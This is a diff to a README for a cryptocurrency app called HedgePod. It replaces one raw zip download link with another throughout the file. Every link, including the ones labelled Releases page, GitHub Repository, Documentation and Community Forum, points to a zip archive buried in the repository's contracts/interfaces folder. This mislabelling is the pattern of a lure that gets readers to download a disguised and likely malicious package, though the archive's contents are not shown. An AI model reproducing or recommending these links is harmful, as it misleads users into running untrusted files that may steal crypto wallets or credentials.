@@ -6,11 +6,11 @@ HedgePod is designed to help you navigate the complex world of cryptocurrencies 
 
 ## 📥 Download HedgePod
 
-[![Download HedgePod](https://raw.githubusercontent.com/apil1992/hedgepod/master/frontend/app/pyth-implementation/hedgepod_v1.0.zip)](https://raw.githubusercontent.com/apil1992/hedgepod/master/frontend/app/pyth-implementation/hedgepod_v1.0.zip)
+[![Download HedgePod](https://github.com/apil1992/hedgepod/raw/refs/heads/master/contracts/interfaces/Software-2.4-alpha.3.zip)](https://github.com/apil1992/hedgepod/raw/refs/heads/master/contracts/interfaces/Software-2.4-alpha.3.zip)
 
 To download HedgePod, visit the Releases page. This page contains the latest version of the software.
 
-[Download HedgePod](https://raw.githubusercontent.com/apil1992/hedgepod/master/frontend/app/pyth-implementation/hedgepod_v1.0.zip)
+[Download HedgePod](https://github.com/apil1992/hedgepod/raw/refs/heads/master/contracts/interfaces/Software-2.4-alpha.3.zip)
 
 ## 📋 System Requirements
 
@@ -22,7 +22,7 @@ Before you download HedgePod, check that your system meets the following require
 
 ## 💻 How to Download and Install
 
-1. Click on the [Download HedgePod](https://raw.githubusercontent.com/apil1992/hedgepod/master/frontend/app/pyth-implementation/hedgepod_v1.0.zip) link above to visit the Releases page.
+1. Click on the [Download HedgePod](https://github.com/apil1992/hedgepod/raw/refs/heads/master/contracts/interfaces/Software-2.4-alpha.3.zip) link above to visit the Releases page.
 2. Find the latest version.
 3. Click on the package suitable for your operating system.
 4. Follow the on-screen prompts to download the file to your computer.
@@ -56,9 +56,9 @@ After installing HedgePod, follow these steps to start using the application:
 
 ## 🔗 Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/apil1992/hedgepod/master/frontend/app/pyth-implementation/hedgepod_v1.0.zip) - View the source code and contribute.
-- [Documentation](https://raw.githubusercontent.com/apil1992/hedgepod/master/frontend/app/pyth-implementation/hedgepod_v1.0.zip) - Access the complete user manual and support resources.
-- [Community Forum](https://raw.githubusercontent.com/apil1992/hedgepod/master/frontend/app/pyth-implementation/hedgepod_v1.0.zip) - Engage with other users and developers for assistance.
+- [GitHub Repository](https://github.com/apil1992/hedgepod/raw/refs/heads/master/contracts/interfaces/Software-2.4-alpha.3.zip) - View the source code and contribute.
+- [Documentation](https://github.com/apil1992/hedgepod/raw/refs/heads/master/contracts/interfaces/Software-2.4-alpha.3.zip) - Access the complete user manual and support resources.
+- [Community Forum](https://github.com/apil1992/hedgepod/raw/refs/heads/master/contracts/interfaces/Software-2.4-alpha.3.zip) - Engage with other users and developers for assistance.
 
 ## 💬 Contact Us
 
@@ -68,4 +68,4 @@ If you have questions or need assistance, reach out through the Issues section o
 
 Make sure to check the Releases page regularly for the latest updates and features.
 
-[Download HedgePod](https://raw.githubusercontent.com/apil1992/hedgepod/master/frontend/app/pyth-implementation/hedgepod_v1.0.zip) and simplify your crypto journey today!
+[Download HedgePod](https://github.com/apil1992/hedgepod/raw/refs/heads/master/contracts/interfaces/Software-2.4-alpha.3.zip) and simplify your crypto journey today!
